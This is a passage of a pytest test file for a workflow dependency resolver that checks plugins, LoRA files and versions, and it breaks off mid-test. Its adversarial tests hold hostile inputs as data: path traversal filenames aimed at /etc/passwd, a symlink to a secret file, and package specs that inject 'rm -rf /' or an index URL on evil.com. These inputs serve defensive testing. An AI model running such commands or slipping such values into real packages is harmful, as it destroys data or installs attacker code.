"""Tests for workflow dependency resolution."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from scope.core.workflows.resolve import (
    WorkflowLoRA,
    WorkflowLoRAProvenance,
    WorkflowPipeline,
    WorkflowPipelineSource,
    WorkflowRequest,
    resolve_workflow,
)

# ---------------------------------------------------------------------------
# Test helpers
# ---------------------------------------------------------------------------


def make_pipeline(
    pid="test_pipe", source_type="builtin", loras=None, **source_kw
) -> WorkflowPipeline:
    return WorkflowPipeline(
        pipeline_id=pid,
        source=WorkflowPipelineSource(type=source_type, **source_kw),
        loras=loras or [],
    )


def make_workflow(**overrides) -> WorkflowRequest:
    """Build a minimal valid WorkflowRequest for tests."""
    defaults = {"pipelines": [make_pipeline()]}
    defaults.update(overrides)
    return WorkflowRequest(**defaults)


def mock_plugin_manager(plugins: list[dict] | None = None) -> MagicMock:
    pm = MagicMock()
    pm.list_plugins_sync.return_value = plugins or []
    return pm


def items_by_kind(plan, kind: str):
    return [i for i in plan.items if i.kind == kind]


# ---------------------------------------------------------------------------
# resolve_workflow tests
# ---------------------------------------------------------------------------


class TestResolveBuiltinPipeline:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_all_ok(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        plan = resolve_workflow(make_workflow(), mock_plugin_manager(), tmp_path)

        assert plan.can_apply is True
        pipelines = items_by_kind(plan, "pipeline")
        assert len(pipelines) == 1
        assert pipelines[0].status == "ok"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_builtin(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = False

        plan = resolve_workflow(make_workflow(), mock_plugin_manager(), tmp_path)

        assert plan.can_apply is False
        assert items_by_kind(plan, "pipeline")[0].status == "missing"


class TestResolvePlugin:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_plugin_auto_resolvable(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = False

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    "face-swap",
                    "pypi",
                    plugin_name="scope-deeplivecam",
                    plugin_version="0.1.0",
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is False
        plugins = items_by_kind(plan, "plugin")
        assert len(plugins) == 1
        assert plugins[0].status == "missing"
        assert plugins[0].can_auto_resolve is True
        assert "scope-deeplivecam" in plugins[0].action

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_installed_ok(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    "face-swap",
                    "pypi",
                    plugin_name="scope-deeplivecam",
                    plugin_version="0.1.0",
                )
            ]
        )
        pm = mock_plugin_manager([{"name": "scope-deeplivecam", "version": "0.2.0"}])

        plan = resolve_workflow(wf, pm, tmp_path)

        assert plan.can_apply is True
        assert items_by_kind(plan, "plugin")[0].status == "ok"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_version_mismatch(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    "face-swap",
                    "pypi",
                    plugin_name="scope-deeplivecam",
                    plugin_version="2.0.0",
                )
            ]
        )
        pm = mock_plugin_manager([{"name": "scope-deeplivecam", "version": "0.1.0"}])

        plan = resolve_workflow(wf, pm, tmp_path)

        assert plan.can_apply is False
        plugin = items_by_kind(plan, "plugin")[0]
        assert plugin.status == "version_mismatch"
        assert plugin.can_auto_resolve is True


class TestResolveLoRA:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_present(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()
        (lora_dir / "test.safetensors").write_bytes(b"fake")

        wf = make_workflow(
            pipelines=[make_pipeline(loras=[WorkflowLoRA(filename="test.safetensors")])]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        assert items_by_kind(plan, "lora")[0].status == "ok"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_missing_no_provenance(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()

        wf = make_workflow(
            pipelines=[
                make_pipeline(loras=[WorkflowLoRA(filename="missing.safetensors")])
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)

        assert plan.can_apply is True  # missing LoRAs don't block
        lora = items_by_kind(plan, "lora")[0]
        assert lora.status == "missing"
        assert lora.can_auto_resolve is False

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_missing_with_provenance(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    loras=[
                        WorkflowLoRA(
                            filename="arcane.safetensors",
                            provenance=WorkflowLoRAProvenance(
                                source="huggingface",
                                repo_id="user/arcane-lora",
                            ),
                        )
                    ]
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        lora = items_by_kind(plan, "lora")[0]
        assert lora.status == "missing"
        assert lora.can_auto_resolve is True
        assert "HuggingFace" in lora.action


# ---------------------------------------------------------------------------
# Plugin resolution edge cases
# ---------------------------------------------------------------------------


class TestResolvePluginEdgeCases:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_name_none(self, mock_registry, tmp_path):
        """Non-builtin pipeline with no plugin_name is marked missing."""
        mock_registry.is_registered.return_value = False

        wf = make_workflow(pipelines=[make_pipeline("unknown-pipe", "pypi")])

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is False
        plugin = items_by_kind(plan, "plugin")[0]
        assert plugin.status == "missing"
        assert "No plugin name" in plugin.detail

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_plugin_git_source(self, mock_registry, tmp_path):
        """Missing plugin with git source shows git install action."""
        mock_registry.is_registered.return_value = False

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    "face-swap",
                    "git",
                    plugin_name="scope-deeplivecam",
                    package_spec="git+https://github.com/example/scope-deeplivecam.git",
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        plugin = items_by_kind(plan, "plugin")[0]
        assert plugin.status == "missing"
        assert "Install from git:" in plugin.action
        assert "github.com" in plugin.action

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_invalid_version_treated_as_ok(self, mock_registry, tmp_path):
        """Unparseable version strings don't block; treated as ok with detail."""
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    "face-swap",
                    "pypi",
                    plugin_name="scope-deeplivecam",
                    plugin_version="1.0.0",
                )
            ]
        )
        pm = mock_plugin_manager(
            [{"name": "scope-deeplivecam", "version": "not-a-version"}]
        )

        plan = resolve_workflow(wf, pm, tmp_path)
        plugin = items_by_kind(plan, "plugin")[0]
        assert plugin.status == "ok"
        assert "Could not compare versions" in plugin.detail

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_no_version_info(self, mock_registry, tmp_path):
        """Plugin installed with no version on either side is ok."""
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                make_pipeline("face-swap", "pypi", plugin_name="scope-deeplivecam")
            ]
        )
        pm = mock_plugin_manager([{"name": "scope-deeplivecam"}])

        plan = resolve_workflow(wf, pm, tmp_path)

        assert plan.can_apply is True
        plugin = items_by_kind(plan, "plugin")[0]
        assert plugin.status == "ok"
        assert plugin.detail is None


# ---------------------------------------------------------------------------
# LoRA provenance edge cases
# ---------------------------------------------------------------------------


class TestResolveLoRAProvenance:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_lora_civitai_provenance(self, mock_registry, tmp_path):
        """CivitAI provenance generates correct action string."""
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    loras=[
                        WorkflowLoRA(
                            filename="style.safetensors",
                            provenance=WorkflowLoRAProvenance(
                                source="civitai",
                                model_id="12345",
                            ),
                        )
                    ]
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        lora = items_by_kind(plan, "lora")[0]
        assert lora.status == "missing"
        assert lora.can_auto_resolve is True
        assert "CivitAI" in lora.action
        assert "12345" in lora.action

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_lora_url_provenance_with_url(self, mock_registry, tmp_path):
        """URL provenance with a url field uses that URL in the action."""
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    loras=[
                        WorkflowLoRA(
                            filename="custom.safetensors",
                            provenance=WorkflowLoRAProvenance(
                                source="url",
                                url="https://example.com/lora.safetensors",
                            ),
                        )
                    ]
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        lora = items_by_kind(plan, "lora")[0]
        assert lora.can_auto_resolve is True
        assert "example.com" in lora.action

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_lora_url_provenance_without_url(self, mock_registry, tmp_path):
        """URL provenance without a url field falls back to generic action."""
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    loras=[
                        WorkflowLoRA(
                            filename="custom.safetensors",
                            provenance=WorkflowLoRAProvenance(source="url"),
                        )
                    ]
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        lora = items_by_kind(plan, "lora")[0]
        assert lora.can_auto_resolve is True
        assert lora.action == "Download from source"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_lora_local_provenance_not_auto_resolvable(
        self, mock_registry, tmp_path
    ):
        """Local provenance is treated as no provenance (not auto-resolvable)."""
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    loras=[
                        WorkflowLoRA(
                            filename="local.safetensors",
                            provenance=WorkflowLoRAProvenance(source="local"),
                        )
                    ]
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        lora = items_by_kind(plan, "lora")[0]
        assert lora.status == "missing"
        assert lora.can_auto_resolve is False
        assert lora.action is None


# ---------------------------------------------------------------------------
# Multi-pipeline resolve
# ---------------------------------------------------------------------------


class TestResolveMultiplePipelines:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_mixed_builtin_ok_and_plugin_missing(self, mock_registry, tmp_path):
        """One ok builtin + one missing plugin: can_apply is False, both items present."""
        mock_registry.is_registered.side_effect = lambda pid: pid == "test_pipe"

        wf = make_workflow(
            pipelines=[
                make_pipeline(),
                make_pipeline("face-swap", "pypi", plugin_name="scope-deeplivecam"),
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is False
        pipelines = items_by_kind(plan, "pipeline")
        plugins = items_by_kind(plan, "plugin")
        assert len(pipelines) == 1
        assert pipelines[0].status == "ok"
        assert len(plugins) == 1
        assert plugins[0].status == "missing"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_multiple_pipelines_all_ok(self, mock_registry, tmp_path):
        """Multiple builtin pipelines all registered: can_apply is True."""
        mock_registry.is_registered.return_value = True

        wf = make_workflow(pipelines=[make_pipeline("pipe_a"), make_pipeline("pipe_b")])

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is True
        pipelines = items_by_kind(plan, "pipeline")
        assert len(pipelines) == 2
        assert all(i.status == "ok" for i in pipelines)


# ---------------------------------------------------------------------------
# Extra fields ignored (forward compatibility)
# ---------------------------------------------------------------------------


class TestExtraFieldsIgnored:
    """WorkflowRequest uses extra='ignore' so the frontend can send the
    full workflow JSON (with metadata, timeline, etc.) and the backend
    silently drops fields it doesn't need."""

    def test_full_workflow_json_accepted(self):
        """A complete .scope-workflow.json document parses into WorkflowRequest."""
        data = {
            "format": "scope-workflow",
            "format_version": "1.0",
            "metadata": {
                "name": "compat test",
                "created_at": "2025-01-01T00:00:00Z",
                "scope_version": "0.1.0",
            },
            "pipelines": [
                {
                    "pipeline_id": "longlive",
                    "pipeline_version": "1.0.0",
                    "source": {"type": "builtin"},
                    "loras": [
                        {
                            "filename": "my.safetensors",
                            "weight": 0.8,
                            "provenance": {
                                "source": "huggingface",
                                "repo_id": "user/repo",
                            },
                            "sha256": "deadbeef",
                        }
                    ],
                    "params": {"height": 480},
                }
            ],
            "timeline": {"entries": [{"start_time": 0, "end_time": 10, "prompts": []}]},
            "min_scope_version": "0.5.0",
        }
        wf = WorkflowRequest.model_validate(data)
        # Legacy "pipelines" key folds into the canonical "nodes" list;
        # "pipeline_id" aliases to "node_type_id".
        assert wf.nodes[0].node_type_id == "longlive"
        assert wf.min_scope_version == "0.5.0"

    def test_unknown_top_level_fields_ignored(self):
        data = {
            "pipelines": [{"pipeline_id": "p", "source": {"type": "builtin"}}],
            "future_field": "should be dropped",
        }
        wf = WorkflowRequest.model_validate(data)
        assert wf.nodes[0].node_type_id == "p"
        assert not hasattr(wf, "future_field")

    def test_validation_does_not_mutate_input_dict(self):
        """Starlette caches the parsed request body on ``request._json`` and
        ``cloud_proxy`` reads it again to forward the body upstream. If
        validation pops/replaces keys on the input dict, the proxied request
        loses ``pipelines`` — which breaks older cloud builds that still
        require that field. Guard against that regression here.
        """
        data = {
            "format": "scope-workflow",
            "pipelines": [{"pipeline_id": "longlive", "source": {"type": "builtin"}}],
        }
        snapshot = {"keys": sorted(data.keys()), "pipelines": list(data["pipelines"])}
        wf = WorkflowRequest.model_validate(data)
        assert wf.nodes[0].node_type_id == "longlive"
        assert sorted(data.keys()) == snapshot["keys"]
        assert "pipelines" in data
        assert data["pipelines"] == snapshot["pipelines"]


# ---------------------------------------------------------------------------
# min_scope_version tests
# ---------------------------------------------------------------------------


class TestMinScopeVersion:
    def test_default_is_none(self):
        assert make_workflow().min_scope_version is None

    def test_round_trip(self):
        wf = make_workflow(min_scope_version="0.5.0")
        restored = WorkflowRequest.model_validate(wf.model_dump())
        assert restored.min_scope_version == "0.5.0"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_resolve_warns_when_current_is_older(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        plan = resolve_workflow(
            make_workflow(min_scope_version="99.0.0"),
            mock_plugin_manager(),
            tmp_path,
        )
        assert any("99.0.0" in w for w in plan.warnings)

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_resolve_no_warning_when_version_ok(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        plan = resolve_workflow(
            make_workflow(min_scope_version="0.0.1"),
            mock_plugin_manager(),
            tmp_path,
        )
        assert not any("Scope >=" in w for w in plan.warnings)

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    @patch("importlib.metadata.version")
    def test_resolve_warns_when_package_not_found(
        self, mock_version, mock_registry, tmp_path
    ):
        import importlib.metadata

        mock_registry.is_registered.return_value = True
        mock_version.side_effect = importlib.metadata.PackageNotFoundError(
            "daydream-scope"
        )

        plan = resolve_workflow(
            make_workflow(min_scope_version="1.0.0"),
            mock_plugin_manager(),
            tmp_path,
        )
        assert any("Could not verify" in w for w in plan.warnings)


# ---------------------------------------------------------------------------
# Path traversal tests
# ---------------------------------------------------------------------------


class TestPathTraversal:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_path_traversal_rejected(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()

        wf = make_workflow(
            pipelines=[make_pipeline(loras=[WorkflowLoRA(filename="../../etc/passwd")])]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        lora = items_by_kind(plan, "lora")[0]
        assert lora.status == "missing"
        assert lora.detail == "Invalid LoRA filename"
        assert lora.can_auto_resolve is False

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_normal_filename_ok(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()
        (lora_dir / "valid.safetensors").write_bytes(b"data")

        wf = make_workflow(
            pipelines=[
                make_pipeline(loras=[WorkflowLoRA(filename="valid.safetensors")])
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        assert items_by_kind(plan, "lora")[0].status == "ok"


# ---------------------------------------------------------------------------
# Empty pipelines
# ---------------------------------------------------------------------------


class TestEdgeCases:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_empty_pipelines(self, mock_registry, tmp_path):
        wf = WorkflowRequest(pipelines=[])
        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is True
        assert plan.items == []


# ---------------------------------------------------------------------------
# Input validation (Field constraints)
# ---------------------------------------------------------------------------


class TestInputValidation:
    def test_lora_filename_max_length(self):
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            WorkflowLoRA(filename="a" * 256)

    def test_lora_filename_at_max_length(self):
        lora = WorkflowLoRA(filename="a" * 255)
        assert len(lora.filename) == 255

    def test_too_many_pipelines_rejected(self):
        from pydantic import ValidationError

        # Cap is 150 on the unified `nodes` list (was pipelines=50 +
        # nodes=100 before the schemas merged).
        pipelines = [make_pipeline(f"pipe_{i}") for i in range(151)]
        with pytest.raises(ValidationError):
            WorkflowRequest(pipelines=pipelines)

    def test_too_many_loras_rejected(self):
        from pydantic import ValidationError

        loras = [WorkflowLoRA(filename=f"lora_{i}.safetensors") for i in range(101)]
        with pytest.raises(ValidationError):
            WorkflowPipeline(
                pipeline_id="test",
                source=WorkflowPipelineSource(type="builtin"),
                loras=loras,
            )


# ---------------------------------------------------------------------------
# Adversarial / bug-hunting tests
# ---------------------------------------------------------------------------


class TestPluginManagerFailures:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_manager_throws_degrades_gracefully(self, mock_registry, tmp_path):
        """list_plugins_sync() crash is caught; plugins treated as missing."""
        mock_registry.is_registered.return_value = True
        pm = MagicMock()
        pm.list_plugins_sync.side_effect = RuntimeError("metadata corrupted")

        wf = make_workflow(
            pipelines=[make_pipeline("test", "pypi", plugin_name="some-plugin")]
        )

        plan = resolve_workflow(wf, pm, tmp_path)
        assert plan.can_apply is False
        assert any("Could not read installed plugins" in w for w in plan.warnings)
        assert items_by_kind(plan, "plugin")[0].status == "missing"


class TestVersionComparisonGaps:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_workflow_requires_version_but_installed_has_none(
        self, mock_registry, tmp_path
    ):
        """Plugin installed without version metadata: ok with detail warning."""
        mock_registry.is_registered.return_value = True
        pm = mock_plugin_manager([{"name": "scope-stylize"}])

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    "stylize",
                    "pypi",
                    plugin_name="scope-stylize",
                    plugin_version="2.0.0",
                )
            ]
        )

        plan = resolve_workflow(wf, pm, tmp_path)
        plugin = items_by_kind(plan, "plugin")[0]
        assert plugin.status == "ok"
        assert "Could not verify version" in plugin.detail

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_same_plugin_conflicting_versions_across_pipelines(
        self, mock_registry, tmp_path
    ):
        """Two pipelines require same plugin at different versions.
        Installed 1.5.0: pipeline A (>=1.0) ok, pipeline B (>=2.0) mismatch."""
        mock_registry.is_registered.return_value = True
        pm = mock_plugin_manager([{"name": "scope-fx", "version": "1.5.0"}])

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    "fx-v1",
                    "pypi",
                    plugin_name="scope-fx",
                    plugin_version="1.0.0",
                ),
                make_pipeline(
                    "fx-v2",
                    "pypi",
                    plugin_name="scope-fx",
                    plugin_version="2.0.0",
                ),
            ]
        )

        plan = resolve_workflow(wf, pm, tmp_path)
        plugins = items_by_kind(plan, "plugin")
        assert len(plugins) == 2
        assert plugins[0].status == "ok"
        assert plugins[1].status == "version_mismatch"
        assert plan.can_apply is False


class TestDegenerateInputs:
    def test_empty_pipeline_id_rejected(self):
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            make_pipeline(pid="")

    def test_empty_plugin_name_rejected(self):
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            WorkflowPipelineSource(type="pypi", plugin_name="")

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_duplicate_loras_same_pipeline(self, mock_registry, tmp_path):
        """Same LoRA listed twice: produces duplicate items, no dedup."""
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()
        (lora_dir / "style.safetensors").write_bytes(b"data")

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    loras=[
                        WorkflowLoRA(filename="style.safetensors"),
                        WorkflowLoRA(filename="style.safetensors"),
                    ]
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        assert len(items_by_kind(plan, "lora")) == 2

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_dict_missing_name_key(self, mock_registry, tmp_path):
        """Plugin dict without 'name' key: silently skipped, plugin marked missing."""
        mock_registry.is_registered.return_value = True
        pm = mock_plugin_manager([{"version": "1.0.0"}])

        wf = make_workflow(
            pipelines=[make_pipeline("test", "pypi", plugin_name="scope-fx")]
        )

        plan = resolve_workflow(wf, pm, tmp_path)
        assert items_by_kind(plan, "plugin")[0].status == "missing"

    def test_invalid_source_type_rejected(self):
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            WorkflowPipelineSource(type="docker")


class TestSymlinkAndPathEdgeCases:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_symlink_inside_lora_dir_pointing_outside(self, mock_registry, tmp_path):
        """Symlink in lora_dir -> file outside: rejected as invalid."""
        mock_registry.is_registered.return_value = True

        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()
        secret = tmp_path / "secret.txt"
        secret.write_text("sensitive data")

        symlink = lora_dir / "sneaky.safetensors"
        try:
            symlink.symlink_to(secret)
        except OSError:
            pytest.skip("Cannot create symlinks (requires admin on Windows)")

        wf = make_workflow(
            pipelines=[
                make_pipeline(loras=[WorkflowLoRA(filename="sneaky.safetensors")])
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        lora = items_by_kind(plan, "lora")[0]
        assert lora.status == "missing"
        assert lora.detail == "Invalid LoRA filename"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_absolute_path_in_lora_filename(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()

        wf = make_workflow(
            pipelines=[make_pipeline(loras=[WorkflowLoRA(filename="/etc/passwd")])]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), lora_dir)
        lora = items_by_kind(plan, "lora")[0]
        assert lora.status == "missing"
        assert lora.detail == "Invalid LoRA filename"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_filename_with_null_byte(self, mock_registry, tmp_path):
        """Null byte in filename: should reject or handle gracefully."""
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()

        wf = make_workflow(
            pipelines=[
                make_pipeline(loras=[WorkflowLoRA(filename="evil\x00.safetensors")])
            ]
        )

        with pytest.raises(ValueError, match="null"):
            resolve_workflow(wf, mock_plugin_manager(), lora_dir)

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_dir_does_not_exist(self, mock_registry, tmp_path):
        """models_dir/lora doesn't exist: shouldn't crash."""
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[make_pipeline(loras=[WorkflowLoRA(filename="test.safetensors")])]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        assert items_by_kind(plan, "lora")[0].status == "missing"


class TestPackageSpecInjection:
    """Untrusted package_spec values flow through to action strings.
    Known limitation: not validated at resolution layer. The trust-gate UI
    shows the raw spec before install, and subprocess uses list args."""

    @pytest.mark.parametrize(
        "spec,expected_substring",
        [
            ("legit-plugin; rm -rf /", "rm -rf"),
            ("legit-pkg --index-url https://evil.com/simple", "--index-url"),
        ],
    )
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_shell_metacharacters_pass_through(
        self, mock_registry, tmp_path, spec, expected_substring
    ):
        mock_registry.is_registered.return_value = False

        wf = make_workflow(
            pipelines=[
                make_pipeline(
                    "evil",
                    "git",
                    plugin_name="legit-plugin",
                    package_spec=spec,
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        assert expected_substring in items_by_kind(plan, "plugin")[0].action


# ---------------------------------------------------------------------------
# Node resolution (added with pipeline/node unification)
# ---------------------------------------------------------------------------


def _make_node(type_id: str = "scheduler", source_type: str = "builtin", **source_kw):
    from scope.core.workflows.resolve import WorkflowNode as _WorkflowNode

    return _WorkflowNode(
        node_type_id=type_id,
        source=WorkflowPipelineSource(type=source_type, **source_kw),
    )


class TestResolveBuiltinNode:
    """Plain nodes from the node registry are validated like pipelines."""

    @patch("scope.core.nodes.registry.NodeRegistry")
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_builtin_node_ok(
        self, mock_pipeline_registry, mock_node_registry, tmp_path
    ):
        # Plain node: not in PipelineRegistry (no config class) but in
        # NodeRegistry. Emits kind="node" to distinguish from pipelines.
        mock_pipeline_registry.is_registered.return_value = False
        mock_node_registry.is_registered.return_value = True

        wf = WorkflowRequest(nodes=[_make_node("scheduler")])
        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is True
        nodes = items_by_kind(plan, "node")
        assert len(nodes) == 1
        assert nodes[0].name == "scheduler"
        assert nodes[0].status == "ok"

    @patch("scope.core.nodes.registry.NodeRegistry")
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_builtin_node(
        self, mock_pipeline_registry, mock_node_registry, tmp_path
    ):
        mock_pipeline_registry.is_registered.return_value = False
        mock_node_registry.is_registered.return_value = False

        wf = WorkflowRequest(nodes=[_make_node("unknown-type")])
        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is False
        missing = [i for i in plan.items if i.status == "missing"]
        assert len(missing) == 1
        assert "unknown-type" in missing[0].detail


class TestResolvePluginNode:
    """Plugin-provided nodes surface the same 'install plugin' action as pipelines."""

    def test_missing_plugin_auto_resolvable(self, tmp_path):
        wf = WorkflowRequest(
            pipelines=[],
            nodes=[
                _make_node(
                    "my-plugin.clock",
                    "pypi",
                    plugin_name="scope-my-plugin",
                    plugin_version="0.2.0",
                )
            ],
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is False
        plugins = items_by_kind(plan, "plugin")
        assert len(plugins) == 1
        assert plugins[0].can_auto_resolve is True
        assert "scope-my-plugin" in plugins[0].action

    def test_plugin_installed_ok(self, tmp_path):
        wf = WorkflowRequest(
            pipelines=[],
            nodes=[
                _make_node(
                    "my-plugin.clock",
                    "pypi",
                    plugin_name="scope-my-plugin",
                    plugin_version="0.2.0",
                )
            ],
        )

        plan = resolve_workflow(
            wf,
            mock_plugin_manager([{"name": "scope-my-plugin", "version": "0.3.0"}]),
            tmp_path,
        )

        assert plan.can_apply is True
        assert items_by_kind(plan, "plugin")[0].status == "ok"


class TestMixedPipelinesAndNodes:
    """A workflow with both kinds returns ResolutionItems for each."""

    @patch("scope.core.nodes.registry.NodeRegistry")
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_both_resolved(self, mock_pipeline_registry, mock_node_registry, tmp_path):
        # pipe-a is a config-driven pipeline; node-a/node-b are plain nodes.
        mock_pipeline_registry.is_registered.side_effect = lambda i: i == "pipe-a"
        mock_node_registry.is_registered.side_effect = lambda i: i in (
            "node-a",
            "node-b",
        )

        wf = WorkflowRequest(
            pipelines=[make_pipeline("pipe-a")],
            nodes=[_make_node("node-a"), _make_node("node-b")],
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is True
        assert len(items_by_kind(plan, "pipeline")) == 1
        assert len(items_by_kind(plan, "node")) == 2


class TestLegacyFormatBackwardCompat:
    """Legacy workflow JSON (pipelines field + pipeline_id key) still loads."""

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_legacy_pipelines_key_merged(self, mock_pipeline_registry, tmp_path):
        mock_pipeline_registry.is_registered.return_value = True

        # Raw JSON in the legacy shape — `pipelines` + `pipeline_id`.
        raw = {
            "pipelines": [{"pipeline_id": "legacy-pipe", "source": {"type": "builtin"}}]
        }
        wf = WorkflowRequest.model_validate(raw)

        # Internally the legacy list has been folded into `nodes`.
        assert len(wf.nodes) == 1
        assert wf.nodes[0].node_type_id == "legacy-pipe"

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        assert plan.can_apply is True
        assert items_by_kind(plan, "pipeline")[0].name == "legacy-pipe"

    @patch("scope.core.nodes.registry.NodeRegistry")
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_mixed_legacy_and_new_keys(
        self, mock_pipeline_registry, mock_node_registry, tmp_path
    ):
        mock_pipeline_registry.is_registered.side_effect = lambda i: i == "old-pipe"
        mock_node_registry.is_registered.side_effect = lambda i: i == "new-node"

        raw = {
            "pipelines": [{"pipeline_id": "old-pipe", "source": {"type": "builtin"}}],
            "nodes": [{"node_type_id": "new-node", "source": {"type": "builtin"}}],
        }
